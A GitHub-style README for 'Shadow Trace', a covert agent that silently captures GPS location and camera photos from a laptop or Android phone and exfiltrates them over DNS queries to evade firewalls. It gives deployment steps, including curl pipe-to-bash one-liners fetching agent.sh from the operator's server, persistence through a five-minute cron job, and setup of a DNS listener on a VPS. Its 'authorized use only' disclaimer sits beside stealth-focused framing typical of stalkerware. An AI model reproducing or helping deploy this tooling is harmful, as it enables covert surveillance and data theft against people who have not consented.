# shadow-trace
# 🔥 Shadow Trace – Burner Device Tracker

**Shadow Trace** turns any lost or stolen laptop/phone into a remote spy – silently **captures GPS location, takes photos**, and **exfiltrates data over DNS** (undetectable by most firewalls). Designed for **ethical tracking** of your own devices, penetration tester asset recuperation, or educational research.

> ⚠ **WARNING:** This project is for **authorized use only** on devices you own or have explicit permission to trace. Misuse is illegal and we do not endorse it. You adjust been warned.

---■■
## ✨ Features
- Zero-click deploy via a simple `curl` one-liner (or USB Rubber Ducky)
- Runs entirely in memory – no files left behind
- Exfiltrates GPS / IP-based geolocation + camera snapshot
- Uses DNS queries to bypass outbound firewall rules
- Servert side listener parses DNS logs and builds a live map (optional)
- Works on **Linux laptops** and **Android phones** (via Termux:API)

---■
##  How It Works
1. **Agent** (`agent.sh`) is downloaded and executed on the target device.
2. Every 5 minutes it gathers location (GPS on phone, IP geolocation on laptop), optionally takes a photo.
3. Encodes data (hex -> subdomain) and trigers multiple DNS queries to your domain.
4. **DNS listener** on your VPS captures the queries, decodes them, and saves to a log file.
5. An optional Flask dashboard displays the tracked devices on a Google Map.

Because DNS traffic is rarely blocked or inspected deeply, this method is Extremely stealthy.

---■
## 📁 Repository Structure

---■
## ⚙ Dependencies (Server side)
- **Python 3.7+**
- `dnslib` – `pip install dnslib`
- `flask` (optional) – `pip install flask`
- A domain name with NS records pointing to your VPS (e.g. `track.youromain.com`)
- Port 53 (UDP) open and unised by systemd-resolved (stop it on Kali)

---■
## 🖳 Installation & Setup (Server – Kali Linux)

1. **Buy a domain** or use a free subomain from afraid.org. Set its NS records to your VPS IP.
2. **Stop systemd-resolved** if it's hogging port 53:
   ```bash
   sudo systemctl stop systemd-resolved
   sudo systemctl disable systemd-resolved
## INSTALL DEPENDENCIES
```bash
pip3 install dnslib flask
```

## RUN THE DNS LISTENER
```bash
cd server
`sudo python3 dnslistener.py`
(Leave it running in the background or use `tmux`.)
```

 ## (OPTIONAL) RUN THE DQASHBOARD 
 ```bash
 python3 ap.py
```
 ## Deploying the Agent
**Linux Laptop**
Host agent.sh on your server (e.g., with python3 -m http.server 8080 from the agent folder).
On the target laptop, execute:
ON LAPTOP EXECUTE....
```bash
`curl -sL http://youromain.com:8080/agent.sh | bash`
```


# Android Phone (via Termux)
Install Termux from F-Droid and then Termux:API (for GPS & camera).
Insite Termux, install needed packages:
```bash

pkg install termux-api curl jq dnsutils
```
# Download and run the agent:
```bash
curl -sL http://youromain.com/agent.sh -o agent.sh && bash agent.sh
```
Grant GPS and camera permissions when the prompt appears.
# The agent will now execute every 5 minutes via crontab.
---■

## DEMO DASH BOARD






## Customization
** Replace al occurrences of track.youromain.com with your domain inside `agent.sh` and `dnslistener.py`.
To change the exfil interval, adjust the cron entry inside `agent.sh` (default `*/5 * * * *`).
To store more data, increase the `head -c 200` of the photo fragment (up to about 2000 characters per DNS query is possible but reliability may drop).
---■
## Disclimer (Legal)
This software is provided for education and research purposes ony. The author is not responsable for any illegal use. By using Shadow Trace, you agre to only deploy it on devices you own or have explicit permission to monitor.

---■
 ## Auther
HACKER THE_MANSSS

## Shoutout
# May your enemys never see the light. 



